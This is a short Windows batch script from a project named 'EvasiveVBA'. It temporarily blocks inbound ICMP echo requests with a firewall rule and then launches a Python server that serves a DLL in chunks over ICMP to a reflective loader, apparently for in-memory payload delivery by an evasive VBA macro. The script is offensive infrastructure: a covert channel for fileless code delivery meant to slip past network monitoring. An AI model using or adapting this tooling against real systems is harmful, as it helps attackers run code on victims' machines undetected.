@echo off
echo [*] Adding firewall rule to suppress kernel ICMP echo replies...
netsh advfirewall firewall delete rule name="EvasiveVBA_BlockEchoReply" >nul 2>&1
netsh advfirewall firewall add rule name="EvasiveVBA_BlockEchoReply" dir=in protocol=icmpv4:8,any action=block >nul 2>&1
echo [*] Starting ICMP server on 192.168.1.212...
echo.
"C:\Users\itag7\AppData\Local\Programs\Python\Python314\python.exe" "C:\Users\itag7\ll_projects\EvasiveVBA\src\scripts\ReflectiveLoader_ICMP\server.py" "C:\Users\itag7\ll_projects\EvasiveVBA\test\test_dll_x64.dll" --chunk-size 1024 --bind 192.168.1.212
echo.
echo [*] Removing firewall rule...
netsh advfirewall firewall delete rule name="EvasiveVBA_BlockEchoReply" >nul 2>&1
pause
